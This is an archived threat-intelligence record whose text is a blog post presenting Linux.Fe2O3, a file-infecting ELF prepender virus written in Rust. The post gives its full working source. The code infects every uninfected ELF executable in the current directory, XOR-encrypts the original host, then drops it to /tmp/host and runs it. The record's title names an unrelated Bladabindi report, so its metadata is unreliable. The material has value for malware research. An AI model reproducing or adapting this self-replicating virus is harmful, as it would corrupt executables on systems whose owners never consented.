{
    "id": "d66064d9-e9a9-4f8d-a173-df24d273cd86",
    "created_at": "2023-01-12T15:07:55.359318Z",
    "updated_at": "2025-03-27T02:06:09.999623Z",
    "deleted_at": null,
    "sha1_hash": "b8c4f172626ee3327c1878b48d9a394429b97973",
    "title": "2016-11-30 - Bladabindi Remains A Constant Threat By Using Dynamic DNS Services",
    "authors": "",
    "file_creation_date": "2022-05-01T12:20:51Z",
    "file_modification_date": "2022-05-01T12:20:51Z",
    "file_size": 199254,
    "plain_text": "# Linux.Fe2O3: a Rust virus\n\n**guitmz.com/linux-fe2o3-rust-virus**\n\nGuilherme Thomazi September 6, 2019\n\n### 4 minute read  Published: 6 Sep, 2019\n\n Simple prepender virus written in Rust\n\n## Overview\n\n### Everytime I try to learn a new programming language, I try by port my prependers (Linux.Zariche, Linux.Liora, Linux.Cephei). Despite the code simplicity, it gives me the chance to understand very useful things in a language, like error handling, file i/o, encryption, memory and a few of its core libraries.\n\n This time, Rust is the language and I must say that I was impressed by its compiler and error handling, but the syntax is still not 100% clear to me (as you can see from my rudimentar code in Linux.Fe2O3) and I wish it had a built-in random library too. This code was written in less than 2 days, of course its not pretty, has lots of .unwrap() (already got great input from some people on Reddit to help me with that, will be addressed) so I apologise in advance.\n\n Like usual, Linux.Fe2O3 is an ELF prepender, which infects files in the current directory. It’s not harmful (no destructive payload), samples were distributed to major AntiVirus companies and there’s really no fancy techniques implemented (although I wish I had implemented execution using the memfd_create syscall but apparently Rust has no native way of calling syscalls besides using inline assembly, which I didn’t wanted to do in this project).\n\n A few bugs were corrected from my previous Vala, Go and Nim viruses and less issues are to be expected with this version. It was tested on Gentoo and CentOS (both 64-bit, but can probably work in 32-bit systems too if Rust doesn’t complain about variable types or things like that, but I don’t really care for 32-bit systems anymore).\n\n As for the name, Fe2O3 is the chemical formula of Rust, so I thought it was a good fit here.\n\n## How it works\n\n### A prepender works by appending its code to the start of the host file and during execution it runs itself and the host file (non destructive). It’s one of the simplest methods of infection available, easy to code and understand. In this case, the host code is encrypted with a simple\n\n\n-----\n\n```\nXOR function just because and decrypted at runtime, dumped into a file (/tmp/host), which\n\n### is then executed and deleted after the virus finishes its own shenanigans.\n\n I don’t like dropping files into the filesystem very much, thats why I wanted to run it from memory using a memory file descriptor but lets leave this to another day.\n\n## Code\n\n### Here’s the full code (also available in my GitHub with further files and instructions):\n\n```\n\n-----\n\n```\nuse std::ffi::{OsStr, OsString};\nuse std::fs::File;\nuse std::io::prelude::*;\nuse std::io::{Read, SeekFrom, Write};\nuse std::os::unix::fs::OpenOptionsExt;\nuse std::process::Command;\nuse std::{env, fs, process};\nconst ELF_MAGIC: &[u8; 4] = &[0x7f, 0x45, 0x4c, 0x46]; // b\"\\x7FELF\"\nconst INFECTION_MARK: &[u8; 5] = &[0x40, 0x54, 0x4d, 0x5a, 0x40]; // @TMZ@\nconst XOR_KEY: &[u8; 5] = &[0x46, 0x65, 0x32, 0x4f, 0x33]; // Fe2O3\nconst VIRUS_SIZE: u64 = 2696040;\nfn payload() {\n  println!(\"Rusting is a chemical reaction of iron in the presence of oxygen.\nCommon sheet metal rusting in dry air works like this: 4 Fe + 3 O2 --> 2 Fe2O3.\nThis reaction is relatively slow and produces a thin coating of stable iron oxide\nFe2O3, which is (technically) rust, but is a fairly benign form of rust.\")\n}\nfn get_file_size(path: &OsStr) -> u64 {\n  let metadata = fs::metadata(&path).unwrap();\n  return metadata.len();\n}\nfn read_file(path: &OsStr) -> Vec<u8> {\n  let mut buf = Vec::new();\n  let mut f = File::open(path).unwrap();\n  f.read_to_end(&mut buf).unwrap();\n  return buf;\n}\nfn xor_enc_dec(input: Vec<u8>) -> Vec<u8> {\n  let mut output = vec![0; input.len()];\n  for x in 0..input.len() {\n    output[x] = input[x] ^ XOR_KEY[x % XOR_KEY.len()];\n  }\n  return output;\n}\nfn is_elf(path: &OsStr) -> bool {\n  let mut ident = [0; 4];\n  let mut f = File::open(path).unwrap();\n  f.read(&mut ident).unwrap();\n  if &ident == ELF_MAGIC { // this will work for PIE executables as well \n    return true;     // but can fail for shared libraries during execution\n  }\n  return false;\n}\nfn is_infected(path: &OsStr) -> bool {\n  let file_size: usize = get_file_size(path) as usize;\n  let buf = read_file(path);\n\n```\n\n-----\n\n```\n  for x in 1..file_size {\n    if &buf[x] == &INFECTION_MARK[0] {\n      for y in 1..INFECTION_MARK.len() {\n        if (x + y) >= file_size {\n          break;\n        }\n        if &buf[x + y] != &INFECTION_MARK[y] {\n          break;\n        }\n        if y == INFECTION_MARK.len() - 1 {\n          return true;\n        }\n      }\n    }\n  }\n  return false;\n}\nfn infect(virus: &OsString, target: &OsStr) {\n  let host_buf = read_file(target);\n  let mut encrypted_host_buf = xor_enc_dec(host_buf);\n  let mut virus_buf = vec![0; VIRUS_SIZE as usize];\n  let mut f = File::open(virus).unwrap();\n  f.read_exact(&mut virus_buf).unwrap();\n  let mut infected = File::create(target).unwrap();\n  infected.write_all(&mut virus_buf).unwrap();\n  infected.write_all(&mut encrypted_host_buf).unwrap();\n  infected.sync_all().unwrap();\n  infected.flush().unwrap();\n}\nfn run_infected_host(path: &OsString) {\n  let mut encrypted_host_buf = Vec::new();\n  let mut infected = File::open(path).unwrap();\n  let plain_host_path = \"/tmp/host\";\n  let mut plain_host = fs::OpenOptions::new()\n    .create(true)\n    .write(true)\n    .mode(0o755)\n    .open(plain_host_path)\n    .unwrap(); \n  infected.seek(SeekFrom::Start(VIRUS_SIZE)).unwrap();\n  infected.read_to_end(&mut encrypted_host_buf).unwrap();\n  drop(infected);\n  let mut decrypted_host_buf = xor_enc_dec(encrypted_host_buf);\n  plain_host.write_all(&mut decrypted_host_buf).unwrap();\n  plain_host.sync_all().unwrap();\n  plain_host.flush().unwrap();\n  drop(plain_host);\n  Command::new(plain_host_path).status().unwrap();\n  fs::remove_file(plain_host_path).unwrap();\n\n```\n\n-----\n\n```\n}\nfn main() {\n  let args: Vec<String> = env::args().collect();\n  let myself = OsString::from(&args[0]);\n  let current_dir = env::current_dir().unwrap();\n  for entry in fs::read_dir(current_dir).unwrap() {\n    let entry = entry.unwrap();\n    let path = entry.path();\n    let metadata = fs::metadata(&path).unwrap();\n    if metadata.is_file() {\n      let entry_name = path.file_name().unwrap();\n      if myself == entry_name {\n        continue;\n      }\n      if is_elf(entry_name) {\n        if !is_infected(entry_name) {\n          infect(&myself, entry_name);\n        }\n      }\n    }\n  }\n  if get_file_size(&myself) > VIRUS_SIZE {\n    payload();\n    run_infected_host(&myself);\n  } else {\n    process::exit(0)\n  }\n}\n\n### A little payload message is included too:\nRusting is a chemical reaction of iron in the presence of oxygen.\nCommon sheet metal rusting in dry air works like this: 4 Fe + 3 O2 --> 2 Fe2O3.\nThis reaction is relatively slow and produces a thin coating of stable iron oxide\nFe2O3, which is (technically) rust, but is a fairly benign form of rust.\n\n A binary sample is also available here with SHA1\nc185ab0fd9b1c8f3ddaed7079898383edbcbb7f7 .\n$ file Linux.Fe2O3\nLinux.Fe2O3: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically\nlinked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, with\ndebug_info, not stripped\n\n## Demo\n\n```\n\n-----\n\n### I have high hopes for Rust. Recently it was discussed that it could be used to write Linux kernel modules (only C is available for that now), which is a huge deal. The syntax somewhat throws me off a bit but that’s because I’m not used to it, I’m sure I can easily overcome this with time. All in all, this was a fun project.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Infection/ELF Infection in Rust - Fe2O3 virus.pdf"
    ],
    "report_names": [
        "ELF Infection in Rust - Fe2O3 virus.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536075,
    "ts_updated_at": 1743041169,
    "ts_creation_date": 1651407651,
    "ts_modification_date": 1651407651,
    "files": {
        "pdf": "https://archive.orkl.eu/b8c4f172626ee3327c1878b48d9a394429b97973.pdf",
        "text": "https://archive.orkl.eu/b8c4f172626ee3327c1878b48d9a394429b97973.txt",
        "img": "https://archive.orkl.eu/b8c4f172626ee3327c1878b48d9a394429b97973.jpg"
    }
}